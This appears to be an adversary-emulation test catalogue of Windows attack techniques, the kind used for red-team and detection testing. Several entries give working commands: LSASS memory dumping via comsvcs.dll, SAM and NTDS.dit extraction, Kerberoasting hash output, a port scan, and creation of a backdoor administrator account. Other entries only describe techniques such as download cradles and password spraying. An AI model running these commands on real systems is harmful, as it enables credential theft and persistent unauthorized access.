name: Dump LSASS memory using ProcDump
description: Dumps LSASS process memory using Sysinternals ProcDump to a file that can be parsed offline with Mimikatz.
dependencies: ProcDump from Sysinternals must be present at C:\Tools\procdump.exe

name: Dump LSASS memory using comsvcs.dll
description: Uses the built-in Windows comsvcs.dll MiniDump export to dump LSASS memory without external tools.
command: $lsass = Get-Process lsass; $out = "$env:TEMP\lsass.dmp"; rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass.Id $out full

name: Mimikatz - Dump credentials from LSASS
description: Uses Mimikatz sekurlsa::logonpasswords to dump credentials from LSASS memory.

name: Dump LSASS with Task Manager
description: Uses Windows Task Manager to create a dump of the LSASS process.
command:
1. Open Task Manager as Administrator
2. Go to Details tab
3. Right-click lsass.exe
4. Select 'Create dump file'
5. Dump is saved to %TEMP%\lsass.DMP

name: Dump LSASS using Windows Error Reporting
description: Leverages Windows Error Reporting (WER) to create an LSASS dump via silent process exit.

name: Dump SAM using reg.exe
description: Exports the SAM registry hive to a file for offline password hash extraction.
command: reg save HKLM\SAM %TEMP%\sam.hive && reg save HKLM\SYSTEM %TEMP%\system.hive

name: Extract SAM hashes with Secretsdump
description: Uses Impacket's secretsdump.py to remotely extract SAM hashes.
dependencies: SAM and SYSTEM hives must be available

name: Dump NTDS.dit using ntdsutil
description: Uses ntdsutil to create a copy of the Active Directory database.
command: ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q
dependencies: Must run on Domain Controller as Administrator

name: Dump NTDS using VSS shadow copy
description: Creates a Volume Shadow Copy and copies NTDS.dit from it.
command: $shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible'); $id = $shadow.ShadowID; $vol = (Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq $id}).DeviceObject; cmd /c copy "$vol\Windows\NTDS\ntds.dit" C:\Temp\ntds.dit
dependencies: Must run on Domain Controller as Administrator

name: Kerberoasting with Invoke-Kerberoast
description: Uses PowerSploit's Invoke-Kerberoast to request TGS tickets for all service accounts and output crackable hashes.
command: Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File -FilePath .\kerberoast_hashes.txt

name: Kerberoasting with Rubeus
description: Uses Rubeus to request TGS tickets and output them in a crackable format.

name: Crack Kerberoast hashes with Hashcat
description: Cracks extracted Kerberos TGS hashes using Hashcat with a wordlist.

name: Password Spray with Spray
description: Uses the Spray tool to perform a password spray attack against Active Directory.

name: PowerShell encoded command execution
description: Executes an encoded PowerShell command to bypass script logging.

name: PowerShell download cradle
description: Downloads and executes a PowerShell script from a remote server.

name: Network scanning with nmap
description: Performs a TCP SYN scan to discover open services on a target subnet.
dependencies: Appropriate network access to target subnet

name: Network scanning with PowerShell
description: Uses PowerShell to perform a basic port scan without external tools.
command: 1..1024 | ForEach-Object { $port = $_; Try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect('192.168.1.1', $port); "$port OPEN"; $tcp.Close() } Catch {} }

name: Mount administrative share with net use
description: Uses net use to connect to a remote admin share for lateral movement.

name: Create a scheduled task for persistence
description: Creates a scheduled task that runs a payload on user logon for persistence.
dependencies: Payload must exist at specified path

name: Add registry run key for persistence
description: Adds a registry run key to execute a payload on every user login.

name: Create a local admin account
description: Creates a new local administrator account for persistent access.
command: net user attacker P@ssword123 /add && net localgroup administrators attacker /add
